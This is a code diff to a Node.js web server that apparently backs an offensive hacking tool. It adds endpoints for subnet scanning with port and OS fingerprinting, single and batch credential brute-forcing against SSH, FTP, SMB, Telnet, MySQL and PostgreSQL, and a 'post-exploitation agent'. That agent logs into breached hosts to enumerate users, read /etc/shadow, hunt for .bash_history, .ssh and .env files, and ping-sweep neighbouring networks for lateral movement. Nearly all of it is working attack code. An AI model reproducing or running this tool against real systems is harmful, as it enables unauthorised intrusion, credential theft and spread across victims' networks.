@@ -313,6 +313,124 @@ function handleApiRequest(urlPath, method, body, res) {
         return;
     }
 
+    // Smart Post-Exploitation Agent
+    if (urlPath === '/api/post-exploit-agent' && method === 'POST') {
+        const data = JSON.parse(body);
+        postExploitAgent(data.host, data.method || 'SSH', data.credentials || {}, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Test credentials against a specific host/service
+    if (urlPath === '/api/test-credentials' && method === 'POST') {
+        const data = JSON.parse(body);
+        testCredentials(data.host, data.port || 22, data.service || 'ssh', data.username || 'admin', data.password || 'admin', (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Batch test credentials against a host/service
+    if (urlPath === '/api/batch-test-credentials' && method === 'POST') {
+        const data = JSON.parse(body);
+        const creds = data.credentials || [{ username: 'admin', password: 'admin' }];
+        batchTestCredentials(data.host, data.port || 22, data.service || 'ssh', creds, (result) => {
+            res.writeHead(200);
+            res.end(JSON.stringify(result));
+        });
+        return;
+    }
+
+    // Network scan a specific subnet
+    if (urlPath === '/api/scan-subnet' && method === 'POST') {
+        const data = JSON.parse(body);
+        const subnet = data.subnet; // e.g., "192.168.1"
+        if (!subnet) {
+            res.writeHead(400);
+            res.end(JSON.stringify({ error: 'Subnet required (e.g., 192.168.1)' }));
+            return;
+        }
+        const startIp = data.startIp || 1;
+        const endIp = data.endIp || 254;
+        const hosts = [];
+        let scanned = 0;
+        const total = endIp - startIp + 1;
+
+        function scanNext(i) {
+            if (i > endIp) {
+                res.writeHead(200);
+                res.end(JSON.stringify({ subnet, hosts, total: hosts.length, scanned }));
+                return;
+            }
+            const ip = `${subnet}.${i}`;
+            pingHost(ip, (alive) => {
+                scanned++;
+                if (alive) {
+                    scanPortsBatch(ip, [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 554, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 27017], (openPorts) => {
+                        fingerprintOS(ip, openPorts, (osInfo) => {
+                            const deviceType = identifyDeviceType(openPorts, osInfo);
+                            hosts.push({
+                                ip, alive: true, openPorts,
+                                os: osInfo, deviceType,
+                                services: openPorts.map(p => getServiceName(p))
+                            });
+                            scanNext(i + 1);
+                        });
+                    });
+                } else {
+                    scanNext(i + 1);
+                }
+            });
+        }
+
+        // Process 5 IPs concurrently for speed
+        let concurrent = 0;
+        const maxConcurrent = 5;
+        let nextIp = startIp;
+        const allDone = [];
+
+        function processIp(i) {
+            const ip = `${subnet}.${i}`;
+            pingHost(ip, (alive) => {
+                scanned++;
+                if (alive) {
+                    scanPortsBatch(ip, [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 554, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888, 27017], (openPorts) => {
+                        fingerprintOS(ip, openPorts, (osInfo) => {
+                            const deviceType = identifyDeviceType(openPorts, osInfo);
+                            hosts.push({
+                                ip, alive: true, openPorts,
+                                os: osInfo, deviceType,
+                                services: openPorts.map(p => getServiceName(p))
+                            });
+                            concurrent--;
+                            launchNext();
+                        });
+                    });
+                } else {
+                    concurrent--;
+                    launchNext();
+                }
+            });
+        }
+
+        function launchNext() {
+            while (concurrent < maxConcurrent && nextIp <= endIp) {
+                concurrent++;
+                processIp(nextIp++);
+            }
+            if (concurrent === 0 && nextIp > endIp) {
+                res.writeHead(200);
+                res.end(JSON.stringify({ subnet, hosts, total: hosts.length, scanned }));
+            }
+        }
+
+        launchNext();
+        return;
+    }
+
     // Detect installed exploitation tools
     if (urlPath === '/api/detect-tools' && method === 'GET') {
         detectInstalledTools((tools) => {
@@ -1485,6 +1603,252 @@ function mapExploitToATTACK(method) {
         'Nmap-VulnScan': { tactics: ['reconnaissance'], techniques: ['T1595.002'] }
     };
     return mapping[method] || { tactics: ['unknown'], techniques: [] };
+}
+
+// Device type identification based on open ports and OS
+function identifyDeviceType(openPorts, osInfo) {
+    const os = (osInfo || '').toLowerCase();
+    const ports = openPorts || [];
+    if (ports.includes(554) || ports.includes(8554) || os.includes('camera') || os.includes('hikvision') || os.includes('dahua')) return 'Camera';
+    if (ports.includes(80) && ports.includes(53) && !ports.includes(22)) return 'Router';
+    if (ports.includes(80) && (ports.includes(443) || ports.includes(8080)) && ports.length <= 3) return 'IoT Device';
+    if (ports.includes(9100) || ports.includes(515) || ports.includes(631)) return 'Printer';
+    if (ports.includes(3389) || os.includes('windows')) return 'Windows PC';
+    if (ports.includes(22) && (os.includes('linux') || os.includes('ubuntu') || os.includes('debian'))) return 'Linux Server';
+    if (ports.includes(80) || ports.includes(443) || ports.includes(8080)) return 'Web Server';
+    if (ports.includes(3306) || ports.includes(5432) || ports.includes(1433) || ports.includes(27017)) return 'Database Server';
+    if (ports.includes(25) || ports.includes(110) || ports.includes(143)) return 'Mail Server';
+    if (ports.length === 0) return 'Unknown';
+    return 'Network Device';
+}
+
+// Map port number to service name
+function getServiceName(port) {
+    const serviceMap = {
+        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+        80: 'HTTP', 110: 'POP3', 135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP',
+        443: 'HTTPS', 445: 'SMB', 554: 'RTSP', 993: 'IMAPS', 995: 'POP3S',
+        1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP',
+        5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Proxy',
+        8443: 'HTTPS-Alt', 8554: 'RTSP-Alt', 8888: 'HTTP-Alt', 27017: 'MongoDB'
+    };
+    return serviceMap[port] || `Port-${port}`;
+}
+
+// ===== SMART POST-EXPLOITATION AGENT (Monkey Agent) =====
+// After successful exploitation, this agent gathers intelligence and discovers new targets
+
+function postExploitAgent(host, method, credentials, callback) {
+    const results = {
+        host, phase: 'post-exploitation',
+        systemInfo: {}, networkInfo: {}, discoveredHosts: [],
+        credentials: [], services: [], files: []
+    };
+    const isWin = process.platform === 'win32';
+    let pending = 0;
+
+    function done() {
+        pending--;
+        if (pending <= 0) callback(results);
+    }
+
+    function sshExec(cmd, cb) {
+        if (!credentials || !credentials.username) { cb('', false); return; }
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        if (isWin) {
+            exec(`echo y | plink -ssh ${credentials.username}@${host} -pw "${credentials.password}" "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+                cb(stdout || '', !err && stdout && !stdout.includes('denied'));
+            });
+        } else {
+            exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+                cb(stdout || '', !err && stdout && !stdout.includes('denied'));
+            });
+        }
+    }
+
+    function smbExec(cmd, cb) {
+        if (!credentials || !credentials.username) { cb('', false); return; }
+        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
+        if (isWin) {
+            exec(`net use \\\\${host}\\IPC$ /user:${credentials.username} "${credentials.password}" 2>&1 && ${cmd} 2>&1`, { timeout: 15000 }, (err, stdout) => {
+                cb(stdout || '', !err);
+            });
+        } else {
+            exec(`rpcclient -U '${credentials.username}%${escapedPass}' ${host} -c "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
+                cb(stdout || '', !err && !stdout.includes('NT_STATUS'));
+            });
+        }
+    }
+
+    // 1. System Info Gathering
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('uname -a 2>/dev/null; hostname 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5; uptime 2>/dev/null', (out, ok) => {
+            if (ok) results.systemInfo.os = out.substring(0, 400);
+            done();
+        });
+    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
+        smbExec('srvinfo', (out, ok) => {
+            if (ok) results.systemInfo.os = out.substring(0, 400);
+            done();
+        });
+    } else { done(); }
+
+    // 2. Network Discovery - find neighboring hosts
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('arp -a 2>/dev/null; ip neigh 2>/dev/null; cat /proc/net/arp 2>/dev/null', (out, ok) => {
+            if (ok && out) {
+                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
+                results.discoveredHosts = [...new Set(ips)].filter(ip => ip !== host && ip !== '0.0.0.0' && ip !== '255.255.255.255');
+            }
+            done();
+        });
+    } else { done(); }
+
+    // 3. Active Users & Logged-in Sessions
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('w 2>/dev/null; last -5 2>/dev/null; cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1', (out, ok) => {
+            if (ok) results.systemInfo.users = out.substring(0, 500);
+            done();
+        });
+    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
+        smbExec('enumdomusers', (out, ok) => {
+            if (ok) results.systemInfo.users = out.substring(0, 500);
+            done();
+        });
+    } else { done(); }
+
+    // 4. Network Configuration & Interfaces
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null || route -n 2>/dev/null; cat /etc/resolv.conf 2>/dev/null', (out, ok) => {
+            if (ok) {
+                results.networkInfo.interfaces = out.substring(0, 600);
+                const subnets = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}\/\d+/g) || [];
+                results.networkInfo.subnets = [...new Set(subnets)];
+            }
+            done();
+        });
+    } else { done(); }
+
+    // 5. Running Services & Open Ports (from inside)
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null | head -30', (out, ok) => {
+            if (ok) {
+                results.systemInfo.services = out.substring(0, 500);
+                const ports = out.match(/:(\d+)\s/g) || [];
+                results.services = [...new Set(ports.map(p => parseInt(p.replace(':', ''))))].filter(p => p > 0 && p < 65536);
+            }
+            done();
+        });
+    } else { done(); }
+
+    // 6. Credential Harvesting (config files, history)
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('find /home -name ".bash_history" -o -name ".ssh" -o -name "*.conf" -o -name ".env" 2>/dev/null | head -20; cat /etc/shadow 2>/dev/null | head -5', (out, ok) => {
+            if (ok) results.systemInfo.sensitiveFiles = out.substring(0, 500);
+            done();
+        });
+    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
+        smbExec('enumprinters', (out, ok) => {
+            if (ok) results.systemInfo.sensitiveFiles = out.substring(0, 500);
+            done();
+        });
+    } else { done(); }
+
+    // 7. Scan discovered neighbors from inside
+    pending++;
+    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
+        sshExec('for i in $(seq 1 254); do (ping -c1 -W1 $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i 2>/dev/null | grep "bytes from" &); done 2>/dev/null | head -20; wait', (out, ok) => {
+            if (ok && out) {
+                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
+                const newHosts = [...new Set(ips)].filter(ip => ip !== host && !results.discoveredHosts.includes(ip));
+                results.discoveredHosts = [...results.discoveredHosts, ...newHosts];
+            }
+            done();
+        });
+    } else { done(); }
+}
+
+// Built-in network password testing (no external tools needed)
+function testCredentials(host, port, service, username, password, callback) {
+    const timeout = 8000;
+
+    if (service === 'ssh' && port === 22) {
+        attemptSSHExploit(host, username, password, callback);
+    } else if (service === 'ftp' && port === 21) {
+        attemptFTPExploit(host, username, password, callback);
+    } else if (service === 'smb' && (port === 445 || port === 139)) {
+        attemptSMBExploit(host, username, password, callback);
+    } else if (service === 'telnet' && port === 23) {
+        attemptTelnetExploit(host, username, password, callback);
+    } else if (service === 'mysql' && port === 3306) {
+        attemptMySQLExploit(host, username, password, callback);
+    } else if (service === 'postgresql' && port === 5432) {
+        attemptPostgresExploit(host, username, password, callback);
+    } else {
+        // Generic TCP credential test via banner
+        const socket = new net.Socket();
+        socket.setTimeout(timeout);
+        let response = '';
+
+        socket.on('data', (data) => { response += data.toString(); });
+        socket.on('connect', () => {
+            setTimeout(() => {
+                socket.write(`${username}\r\n`);
+                setTimeout(() => {
+                    socket.write(`${password}\r\n`);
+                    setTimeout(() => {
+                        socket.destroy();
+                        const lower = response.toLowerCase();
+                        const success = lower.includes('welcome') || lower.includes('ok') || lower.includes('logged') || lower.includes('success');
+                        callback({ success, method: `TCP-${service}`, host, username, port, info: success ? 'Login successful' : 'Login failed' });
+                    }, 1500);
+                }, 1000);
+            }, 500);
+        });
+        socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: `TCP-${service}`, host, error: 'Timeout' }); });
+        socket.on('error', (err) => { callback({ success: false, method: `TCP-${service}`, host, error: err.message }); });
+        socket.connect(port, host);
+    }
+}
+
+// Batch password testing against a host/service
+function batchTestCredentials(host, port, service, credentials, callback) {
+    const results = [];
+    let index = 0;
+    let found = false;
+
+    function next() {
+        if (index >= credentials.length || found) {
+            const best = results.find(r => r.success);
+            callback({
+                success: !!best,
+                method: best ? best.method : `${service}-brute`,
+                host, port, service,
+                username: best ? best.username : null,
+                password: best ? best.password : null,
+                allResults: results,
+                attempts: results.length,
+                info: best ? `Login successful: ${best.username}` : `All ${results.length} attempts failed`
+            });
+            return;
+        }
+
+        const cred = credentials[index++];
+        testCredentials(host, port, service, cred.username, cred.password, (r) => {
+            r.password = cred.password;
+            results.push(r);
+            if (r.success) found = true;
+            next();
+        });
+    }
+
+    next();
 }
 
 // ===== ENHANCED AUTO-EXPLOIT WITH ALL INTEGRATED TOOLS =====
